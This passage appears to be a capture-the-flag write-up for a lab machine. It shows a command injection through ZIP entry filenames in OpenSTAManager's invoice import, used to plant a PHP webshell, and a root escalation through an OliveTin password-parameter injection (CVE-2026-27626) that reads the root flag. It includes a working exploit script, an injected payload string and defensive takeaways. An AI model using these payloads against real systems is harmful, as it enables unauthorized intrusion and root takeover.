OpenSTAManager Filename Command Injection

The electronic invoice import module (id_module=14) processes uploaded ZIP files. It passes the filename inside the ZIP directly to a shell command for .p7m decryption — without escaping. This allows command injection via the filename.

# Generate malicious ZIP — webshell hidden in filename
python3 - << 'EOF'
import zipfile

# Command: cd into files directory, write a PHP webshell
cmd = "cd files && echo '' > SHELL.php"

# Inject into filename: close quotes, inject command, restore .p7m extension
filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(filename, b"DUMMY_P7M_CONTENT")
EOF

Upload exploit.zip via the import page at http://support_001.enigma.htb/controller.php?id_module=14#tab_48.

Phase 3

Privilege Escalation — OliveTin Command Injection (CVE-2026-27626)

Internal Service Discovery

haris@enigma:~$ ss -tlnp
LISTEN  127.0.0.1:3306    ← MySQL
LISTEN  127.0.0.1:1337    ← OliveTin
LISTEN  127.0.0.1:25      ← postfix

haris@enigma:~$ /usr/local/bin/OliveTin --version
version="3000.10.0"  commit="d22bdeb"
What is OliveTin? OliveTin is a web panel that wraps predefined shell commands into clickable buttons. Admins use it to give non-technical users one-click access to tasks like database backups or service restarts. Version 3000.10.0 is vulnerable to CVE-2026-27626: the password parameter type doesn't filter shell metacharacters, enabling command injection. Critically, OliveTin runs as root.

Port Forward

$ ssh -L 1337:127.0.0.1:1337 haris@10.129.22.194

Access http://127.0.0.1:1337 in the browser. Find the backup_database action.

Command Injection via db_pass Parameter

The action's underlying command is:

mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql

In the db_pass field, enter:

x' ; cat /root/root.txt ; #

This results in:

mysqldump -u backup_svc -p'x' ; cat /root/root.txt ; #' production > /opt/backups/backup.sql
Injection breakdown x' closes the -p' single quote. ; is a command separator. cat /root/root.txt executes as root (OliveTin's UID). ; # comments out the remaining original command. CVE-2026-27626's core flaw: password type parameters skip shell metacharacter filtering, while other types like ascii_identifier are properly sanitized.

Root Flag

Click execute. OliveTin's output displays:

12bf7f217845e2f40dd07f341e7d965f
Appendix

Key Takeaways

NFS anonymous shares leak credentials.

/srv/nfs/onboarding * was open to the world and contained plaintext passwords in a PDF. Always check showmount -e during recon.

Password reuse chains through multiple accounts.

Enigma2024! worked for both kevin and sarah. Each compromised mailbox revealed credentials for the next service.

Filenames in archives are injection vectors.

OpenSTAManager passed ZIP entry filenames to shell commands without escaping. Any application that processes filenames in shell context is vulnerable.

Always dump the database after getting a web shell.

The zz_users table contained haris's bcrypt hash, crackable with rockyou. Config files (config.inc.php) provide the database credentials.

OliveTin running as root is a critical misconfiguration.

CVE-2026-27626 allows command injection through password-type parameters. Web panels that execute shell commands should never run as root.
